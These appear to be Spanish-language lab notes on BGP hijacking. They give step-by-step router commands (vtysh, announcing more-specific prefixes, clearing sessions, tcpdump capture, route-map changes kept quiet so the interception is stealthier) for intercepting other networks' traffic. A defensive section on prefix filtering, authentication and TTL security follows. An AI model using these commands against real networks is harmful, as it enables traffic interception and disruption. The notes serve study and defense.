Ataque dirigido a enrutar / redirigir todo el tráfico del resto de routes o AS para poder capturar sus paquetes. En el secuetro BGP, configuramos / anunciamos, sobre un router en el que tenemos acceso, una nueva red con una métrica menor para establecerla como la ruta más rápida. Así los demás AS utilizarán esta nueva red como la menos costosa.

** Ataque 1 **
Pudiendo operar comandos sobre el router que tenemos acceso. Entramos en la interfaz de configuración de BGP --> `vtysh`
Ver información sobre los demás neighbors --> `show bgp neighbors`
Ver las rutas establecidas --> `show ip neighbors 172.16.12.102 advertised-router`

Entramos al modo configuración general del router --> `configure terminal`
Anunciamos sobre qué router configuramos --> `router bgp 60001`
Creamos unas nuevas redes para cada conexión de interfaz que tenga, en estos casos es muy usual configurar redes con máscara de red 25 --> `network 172.16.2.0/25` ||  `network 172.16.3.0/25`
Acabamos la configuración --> `end`
Limpiamos configuraciones antiguas de BGP --> `clear ip bgp * out`

Para capturar todo el tráfico que está pasando por el router --> `tcpdump -i eth0 -A`

==============================================================================

** Ataque 2 ** 
https://neff.blog/2019/06/05/bgphijacking-part2/

`vtysh` 									// routting configuration
`configure terminal`			// edit the configuration
`router bgp 100`					// router configuration
`network 172.19.0.0/17`			// adding a network. Apply the longest prefix 
`do show running-config`	// shows config updated
`exit`										// exit of configuration terminal
`clear ip bgp * out`			// clear the bpg routing tables
`show ip bgp neighbors`		// shows neighbors info

Route Map Policies
The router begins to promote the new prefix and all of the traffic is routed to the router. As a result, the traffic does not hit the ftp server because Router 3 (R3) forwards traffic back to Router 1 (R1) due to the longest prefix match rule. Consequently, this creates an infinite loop between R1 and R3, where each router continually forwards the traffic to each other. Since this is not considered a very stealthy MITM attack, I updated the routing policies on R1 so that the router forwards traffic to R3. This allows the ftp server to receive the signal.

To update the route map policies I entered the configuration terminal once again. I defined an IP prefix called bgphijack using the following command:

`Ip prefix-list bgphijack seq 5 permit 172.19.0.0/17`

Next, I created two new policies:

-   `Route-map to-as300 deny 5`
    -   `Match ip address prefix-list bgphijack`

-   `Route-map to-as200 permit 5`
    -   `Match ip address prefix-list bgphijack`
    -   `Set community no-export`

![[Pasted image 20210914163707.png]]

==============================================================================

** Defensa contra el secuestro de BGP **
BGP es un protocolo más antiguo que fue diseñado en una época en la que la seguridad de la información no estaba tan madura. A pesar de esto, todavía hay pasos que las personas / empresas pueden tomar para protegerse de los ataques de secuestro.

* Habilitación de listas de control de acceso
Las listas de control de acceso son configuraciones en las que un enrutador puede configurar para controlar los distintos enrutadores con los que desea comunicarse. Puede bloquear el tráfico no deseado, lo que a su vez minimiza el vector de ataque en un enrutador determinado. 
Las mejores prácticas le permiten aceptar solo tráfico de vecinos BGP legítimos y autorizados.

* Habilitar el filtrado de prefijos BGP con listas de prefijos
El filtrado de prefijos es un control de acceso a los prefijos de IP. Los administradores pueden permitir o denegar prefijos específicos de cada vecino de BGP. Además, los administradores pueden prefijar el filtro definiendo las rutas de AS. Esto proporciona un paso adicional para verificar que el prefijo llega a través del AS deseado.

* Habilitación de la autenticación de vecinos de BGP
La autenticación permite que los vecinos de BGP demuestren que son legítimos y confiables.
La autenticación entre vecinos BGP generalmente ocurre cuando dos vecinos habilitan contraseñas para sus enrutadores. Sin autenticación, un atacante puede falsificar la dirección IP de un vecino. Estas contraseñas se comparten como hashes MD5, que es una debilidad de seguridad conocida. Para aumentar la seguridad, los vecinos de BGP deben considerar el uso del protocolo BGPSec o la infraestructura de clave pública de recursos.

* Habilitación del control de seguridad de Time to Live
El control de seguridad Time to Live inspecciona el valor TTL final esperado para los paquetes entrantes a un enrutador. Esto ayuda a prevenir técnicas de manipulación de rutas como la que se muestra arriba. Esta técnica se puede omitir modificando el valor TTL en el paquete. El valor TTL se puede modificar utilizando una herramienta como iptables.

* Habilitar registro
El registro se considera la mejor práctica, ya que proporciona alertas de cambios no autorizados en el vecino BGP. Esto ayuda a monitorear cualquier posible secuestro de BGP en curso.

Para obtener más información sobre cómo defenderse contra el secuestro de BGP, visite los siguientes recursos:

https://apps.nsa.gov/iaarchive/library/reports/a-guide-to-border-gateway-protocol-bgp-best-practices.cfm
https://www.cisco.com/c/en/us/about/security-center/protecting-border-gateway-protocol.html
https://tools.ietf.org/html/rfc7454